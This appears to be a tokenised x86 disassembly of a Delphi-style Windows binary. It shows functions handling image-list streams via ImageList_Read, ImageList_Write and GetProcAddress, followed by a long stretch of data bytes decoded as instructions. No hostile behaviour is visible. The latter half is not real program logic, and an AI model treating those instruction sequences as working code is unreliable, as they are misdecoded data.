mov eax esi
call sub_44b624
test eax eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44c14c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44c12f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_44c02c
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c136
mov eax [ ebp - 0xc ]
call sub_40326c
retn
mov eax edi
call sub_44b624
test eax eax
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_44c160
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_44b624
test eax eax
setg al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_44c070
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_44c1bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4196f8
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
push ebp
call sub_44c160
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44c214
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax ebx
call sub_41584c
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax ebx
call sub_41584c
mov dl 0x1
mov eax [ r-xdata ]
call sub_421534
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44c498
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_415620
mov esi eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ ebp - 0x18 ]
add eax esi
cdq
push edx
push eax
mov eax ebx
call sub_415640
mov dl 0x1
mov eax [ r-xdata ]
call sub_421534
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44c47b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_421534
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_421534
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_42286c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_412594
mov eax [ ebp - 0x4 ]
call sub_44c840
xor eax eax
push ebp
push sub_44c45e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
cdq
idiv ecx
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c465
mov eax [ ebp - 0xc ]
call sub_40326c
mov eax [ ebp - 0x14 ]
call sub_40326c
mov eax [ ebp - 0x4 ]
call sub_44c844
retn
inc eax
mov [ ebp - 0x20 ] eax
xor edi edi
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x34 ]
cdq
idiv ecx
mov esi eax
dec esi
test esi esi
jl r-xdata
inc edi
dec [ ebp - 0x20 ]
jne r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_4125bc
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_421afc
push eax
mov eax [ ebp - 0xc ]
call sub_421afc
lea edx [ ebp - 0x30 ]
pop ecx
call sub_41d0d0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_4125bc
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_421afc
push eax
mov eax [ ebp - 0x14 ]
call sub_421afc
lea edx [ ebp - 0x30 ]
pop ecx
call sub_41d0d0
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44b43c
dec [ ebp - 0x1c ]
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_44c4a8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_419e78
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44c508
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44b2c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c50f
mov eax [ ebp - 0xc ]
call sub_40326c
retn
sub eax 0xffffffec
sub_44c50f
mov eax [ ebp - 0x4 ]
call sub_44b12c
test al al
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44c63e
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_415640
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_415d48
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_415640
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x11 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_40326c
retn
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_415640
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_419e78
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44c621
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x38
mov eax [ ebp - 0x10 ]
call sub_415640
lea edx [ ebp - 0x12 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44b2c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_40326c
retn
sub eax 0xffffffec
mov al [ ebp - 0x12 ]
or [ ebp - 0x11 ] al
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_415640
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
dec eax
sete bl
sub_44c670
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
call sub_44b364
mov eax edi
call sub_415620
mov [ esp + 0xc ] eax
mov edx esp
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov bl [ esp ]
and bl 0xff
mov ax [ esp ]
shr ax 0x8
mov [ esp + 0x8 ] al
mov eax [ esp + 0xc ]
cdq
push edx
push eax
mov eax edi
call sub_415640
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx edi
mov eax esi
call sub_44c214
cmp bl 0x49
jne r-xdata
cmp [ esp + 0x8 ] 0x4c
jne r-xdata
mov edx edi
mov eax esi
call sub_44c4a8
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_44c6fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_419e78
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44c7f6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax r-xdata
call sub_40bc64
mov [ rw-data ] eax
cmp [ rw-data ] 0x60000
jb r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push r-xdata
call GetModuleHandleA
mov edi eax
test edi edi
je r-xdata
push eax
mov eax ebx
call sub_44b300
push eax
call ImageList_Write
test eax eax
jne r-xdata
sub eax 0xffffffec
push eax
push 0x1
mov eax ebx
call sub_44b300
push eax
call [ rw-data ]
test eax eax
je r-xdata
sub eax 0xffffffec
push r-xdata
push edi
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c7fd
mov eax [ ebp - 0x4 ]
call sub_40326c
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4d0
call sub_4039f8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4d0
call sub_4039f8
jmp r-xdata
sub_44c864
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40325c
test bl bl
jle r-xdata
mov edx esi
call sub_44bfd4
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_44c8b0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44c8d5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c8dc
retn
sub_44cb1b
adc [ eax ] al
shl [ ecx + 0x103c0041 ] 0x1
inc eax
add [ eax + edx ] bh
je r-xdata
je r-xdata
inc esp
add [ esp + ebx * 4 + 0x41 ] al
inc esi
insb
popad
add [ bx + si ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + ecx * 8 ] ch
inc esp
add [ 0x756e654d ] al
jae r-xdata
add [ ecx ] bh
inc esp
add [ ebx + ebx * 4 - 0x63d7ffbf ] dl
inc ecx
add [ esp + ebx * 4 + 0x41 ] bh
add [ eax ] ah
fiadd [ eax + eax + 0x58 ]
fiadd [ eax + eax - 0x78 ]
fiadd [ eax + eax + 0x1c ]
fild [ eax + eax - 0x48 ]
fiadd [ eax + eax + 0x74 ]
movsd [ edi ] [ esi ]
inc esp
add al ch
fiadd [ eax + eax + 0x58 ]
fild [ eax + eax - 0x74 ]
fild [ eax + eax - 0x40 ]
fild [ eax + eax + 0x1c ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx * 8 + 0x44 ] ah
add [ eax + eax ] bl
add [ eax ] al
insd
inc ecx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
int 0x44
add [ eax ] bh
inc esp
add [ eax + 0x44 ] bl
add [ eax + 0x44 ] bh
add al ch
movsd [ edi ] [ esi ]
inc esp
add [ eax - 0x5a0fffbc ] bl
inc esp
add ah dh
movsd [ edi ] [ esi ]
inc esp
add [ eax - 0x23ffbb20 ] bh
loopne r-xdata
inc eax
add [ ebx + 0x44cb30c0 ] cl
add [ ebx ] al
adc [ ebp + ecx * 2 + 0x65 ] edx
outsb
jne r-xdata
cmp al 0x10
shr al 0xcb
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
outsd
inc esi
insb
imul ebp [ edi + 0x6e ] 0x6b6e694c
ror ah 0x44
inc ecx
add al bl
cwde
inc ecx
add [ eax ] cl
fwait
inc ecx
add al dh
xchg edi eax
inc ecx
add al ch
xchg edi eax
inc ecx
add [ eax ] dl
fwait
inc ecx
add [ eax - 0x1f ] ch
inc esp
add [ eax + 0x480044fc ] bh
0xfe680044 0x44
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
in al 0xe1
inc esp
add [ edx - 0x650fffbf ] dl
inc ecx
add al al
xor al 0x40
add [ esp + edx * 4 + 0x41 ] al
add ah bh
loopne r-xdata
add ah al
inc eax
add al al
xor al 0x40
outsd
insd
popad
je r-xdata
add al dh
0x34c00041 0x40
inc esp
xchg esp eax
inc ecx
add [ ecx ] bl
inc esp
add al bh
fld [ eax + eax + 0xf ]
push esp
dec ebp
outsb
jne r-xdata
cmp al 0x9e
arpl [ eax ] cx
insd
popad
dec ebp
popad
outsb
jne r-xdata
enter 0x4034 0x0
mov esp 0x4004034
xor al [ eax ]
and [ edx ] dh
inc eax
add ah ah
loope r-xdata
add [ ebp + ecx * 8 + 0x44 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] ah
int 0x44
add [ esi - 0x33 ] cl
inc esp
add [ eax + eax + 0x22940000 ] ch
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or ch cl
inc esp
inc esp
add [ esp + esi + 0x34c00040 ] dh
inc eax
sahf
insb
or [ ebp + 0x61 ] ch
push eax
popad
jb r-xdata
add al cl
add al 0x45
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x300040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
pop eax
add [ eax ] al
add [ edi ] al
add bh ch
add [ eax + 0xa ] dh
inc ebp
add ah dh
out 0x44 eax
add [ edi + edi - 0x19c3ffbf ] al
inc esp
add al ch
or al [ ebp ]
loopne r-xdata
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
fcomp [ ebx - 0x2223ffbf ]
inc esp
add [ eax ] dl
outsb
je r-xdata
js r-xdata
dec ebp
outsb
jne r-xdata
popad
add [ bx + si ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ebx + ecx * 8 ] ch
inc esp
add [ ebx ] cl
insd
popad
inc ecx
jne r-xdata
inc esp
add [ ebx ] al
or eax 0x6e654d54
jne r-xdata
pushfd
inc ecx
add ah dh
fild [ eax + eax + 0x44 ]
pushfd
add ah bl
fld [ eax + eax + 0x10 ]
add [ eax ] al
add [ esi + ebx * 4 ] bh
jne r-xdata
inc ecx
outsd
sub_44cd2c
clc
push edx
push ecx
dec [ eax + ecx ]
inc ebp
add [ edx + eax ] cl
inc ebp
add ah bl
add al [ ebp ]
adc al 0x3
inc ebp
add [ edi + eax + 0x45 ] bh
add [ eax + 0x7 ] ch
inc ebp
add [ eax ] ch
inc ebp
add [ ecx ] cl
push esp
dec ebp
outsb
jne r-xdata
test al 0x0
add bh bh
test al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
push es
add [ esi ] al
inc edx
inc ebx
push 0x2c6b6365

arpl [ ebx + 0x2c ] bp
insd
pop esp
int 0x44
add [ edi ] al
or [ ebp + ecx * 2 + 0x65 ] edx
outsb
jne r-xdata
add eax [ eax ]
or [ ecx + 0x75 ] eax
je r-xdata
add [ eax ] 0x0
add [ eax ] al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
insd
ror ah 0x44
add [ eax + 0x18004123 ] dl
add [ 0x756e654d ] al
jae r-xdata
inc edx
jb r-xdata
dec eax
outsd
je r-xdata
add [ eax ] al
add [ edx ] 0x0
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax - 0x57010000 ] ch
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
and eax 0x1fc0041
inc ebp
add [ eax + 0x1004506 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x41060002 ] al
outsb
jne r-xdata
imul edx [ eax + edx + 0x300040 ] 0x0
popad
jns r-xdata
push esp
adc [ eax ] al
aas
add [ eax ] al
insd
popad
jae r-xdata
add bh bh
jl r-xdata
sub al 0xcb
inc esp
add [ eax + eax ] bh
add bh bh
sbb [ eax * 2 + 0x100 ] dl
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add eax 0x75411100
je r-xdata
adc [ eax ] al
cmp al [ eax ]
add bh bh
xor al 0x3
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
inc esp
popa
jne r-xdata
inc ebp
add [ eax + 0x9 ] dl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070008 ] al
popad
jo r-xdata
outsb
add [ eax ] dl
inc eax
add [ eax ] bh
add [ eax ] al
imul esi [ ebp + ebp * 2 + 0x61 ] 0x44c94070
add [ eax ] cl
add bh bh
insb
add [ ebp ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop es
add [ 0x61657242 ] al
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
lodsb [ esi ]
mov bh 0x41
add [ eax + 0x6 ] dh
inc ebp
add [ eax ] cl
pop es
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42060006 ] al
js r-xdata
je r-xdata
add [ eax ] al
inc [ eax + 0x1 ]
inc ebp
add [ eax + 0x4509 ] dl
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
imul ebp [ edi + 0x6e ] r-xdata
cmp [ eax ] al
add bh bh
in al dx
add [ ebp ] al
jo r-xdata
adc [ edx ] cl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
xchg esp eax
adc [ eax ] al
pop eax
add [ eax ] al
[ eax ]
add bh bh
mov al 0x9
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4804000f ] al
imul ebp [ esi + 0x74 ] r-xdata
inc eax
add [ eax ] al
[ edx + eax + 0x45 ]
or al 0x0
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
adc [ eax ] al
cmp [ eax ] eax
add bh bh
inc eax
add [ ebp ] eax
nop
or [ ebp ] eax
add [ eax ] al
add [ eax + 0x1 ] al
add [ ecx ] cl
add [ edi ] al
inc ebx
push 0x656b6365
cld
scasb [ edi ]
inc esp
add [ eax + eax ] bh
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
pop es
cwde
add [ eax ] al
inc ebx
jne r-xdata
inc ecx
add al dh
0x34c00041 0x40
inc esp
xchg esp eax
inc ecx
outsb
arpl [ ebp + 0x64 ] sp
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120016 ] al
outsb
inc ecx
jbe r-xdata
add [ eax ] dl
inc eax
add [ esi ] bh
add [ eax ] al
[ edx + eax + 0x45 ]
add [ eax ] dh
or al [ ebp ]
add [ eax ] al
add [ eax + 0x1 ] al
adc eax [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0xdc656c62
adc [ ecx ] al
mov [ eax ] al
add bh bh
mov [ eax ] al
add bh bh
push eax
or al [ ebp ]
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al 0x0
pop es
dec edi
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
nop
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0015 ] al
outsb
inc esp
jb r-xdata
add al cl
xor al 0x40
add [ esp + edx * 4 + 0x41 ] al
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ja r-xdata
add [ edx ] dh
rol [ eax + eax + 0x46 ] 0x1
rol [ eax + eax + 0x58 ] 0x1
add [ eax ] al
add [ edx - 0x650fffbf ] dl
inc ecx
add al al
je r-xdata
add [ 0x654d6e4f ] cl
popad
jae r-xdata
je r-xdata
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
sbb al 0x15
inc ebp
add [ eax + 0x40 ] ch
inc ecx
add al bh
xchg esi eax
inc ecx
add [ edi + edi + 0x1d440041 ] al
inc ebp
add al ah
sbb eax 0x97e00045
insd
mov esp 0xa00044ca
add [ eax ] al
jmp [ eax + 0x1ff0000 ]
jb r-xdata
and cl dl
inc esp
add [ eax - 0x2f ] dl
inc esp
add [ eax ] al
insd
inc esp
0x44
inc ecx
add al bl
cwde
inc ecx
add [ eax ] cl
fwait
inc ecx
add al dh
xchg edi eax
inc ecx
add al ch
xchg edi eax
inc ecx
add [ eax ] dl
fwait
inc ecx
add [ eax + 0x2c004514 ] al
sbb eax 0x15700045
inc ebp
add [ ebp + ebx + 0x45 ] bl
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x3c0040 ] dl
add [ eax ] al
add eax [ eax ]
std
inc ebp
add al ah
dec ecx
je r-xdata
xchg edi eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
lea eax [ eax ]
in al 0xd0
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
rol [ eax + eax + 0x50 ] 0x1
rol [ eax + eax ] 0x1
sub_44cf09
mov eax 0x1004501
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x72470a00
outsd
jne r-xdata
adc [ eax ] al
cmp eax 0xe0ff0000
pop es
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ edx + 0x61 ] edx
imul ebp [ fs : edi + 0x49 ] 0xc46d6574
adc [ ecx ] al
pushad
add [ eax ] al
dec [ eax + 0x2 ]
inc ebp
add [ eax ] dl
or al [ ebp ]
add [ eax ] al
add [ eax ] al
dec ecx
outsb
js r-xdata
cwde
add [ eax ] al
inc ebx
jne r-xdata
jmp eax
adc [ ecx ] al
push esp
add [ eax ] al
call [ eax + eax ]
call eax
or [ ebp ] eax
add [ eax ] al
add [ eax ] al
push cs
add [ ebx ] cl
dec eax
insb
jo r-xdata
inc ecx
add al dh
0x34c00041 0x40
inc esp
xchg esp eax
inc ecx
outsb
arpl [ ebp + 0x64 ] sp
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120016 ] al
outsb
inc ecx
jbe r-xdata
add [ eax ] dl
inc eax
add [ esi ] bh
add [ eax ] al
[ edx + eax + 0x45 ]
add [ eax ] dh
or al [ ebp ]
add [ eax ] al
add [ eax + 0x1 ] al
adc eax [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0xdc656c62
adc [ ecx ] al
mov [ eax ] al
add bh bh
mov [ eax ] al
add bh bh
push eax
or al [ ebp ]
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al 0x0
pop es
dec edi
outsb
inc ebx
insb
dec ecx
outsb
js r-xdata
outsd
outsb
je r-xdata
add al cl
xor al 0x40
add [ esp + edx * 4 + 0x41 ] al
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ja r-xdata
outsd
dec ecx
je r-xdata
js r-xdata
add [ edx ] dh
rol [ eax + eax + 0x46 ] 0x1
rol [ eax + eax + 0x58 ] 0x1
add [ eax ] al
add [ edx - 0x650fffbf ] dl
inc ecx
add al al
je r-xdata
add [ 0x654d6e4f ] cl
popad
jae r-xdata
je r-xdata
imul esp [ ebx + 0x6b ] r-xdata
nop
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0015 ] al
outsb
inc esp
jb r-xdata
adc al [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
insd
les edx [ eax ]
inc ecx
add [ eax ] ah
add bh bh
dec eax
add al [ ebp ]
adc [ edx ] cl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
xchg esp eax
adc [ eax ] al
pop eax
add [ eax ] al
[ eax ]
add bh bh
mov al 0x9
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4804000f ] al
imul ebp [ esi + 0x74 ] r-xdata
inc eax
add [ eax ] al
[ edx + eax + 0x45 ]
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
sbb al 0x15
inc ebp
add [ eax + 0x40 ] ch
inc ecx
add al bh
xchg esi eax
inc ecx
add [ edi + edi + 0x1d440041 ] al
inc ebp
add al ah
sbb eax 0x97e00045
insd
mov esp 0xa00044ca
add [ eax ] al
jmp [ eax + 0x1ff0000 ]
jb r-xdata
and cl dl
inc esp
add [ eax - 0x2f ] dl
inc esp
add [ eax ] al
insd
inc esp
0x44
inc ecx
add al bl
cwde
inc ecx
add [ eax ] cl
fwait
inc ecx
add al dh
xchg edi eax
inc ecx
add al ch
xchg edi eax
inc ecx
add [ eax ] dl
fwait
inc ecx
add [ eax + 0x2c004514 ] al
sbb eax 0x15700045
inc ebp
add [ ebp + ebx + 0x45 ] bl
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x3c0040 ] dl
add [ eax ] al
add eax [ eax ]
std
inc ebp
add al ah
dec ecx
je r-xdata
xchg edi eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
lea eax [ eax ]
in al 0xd0
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
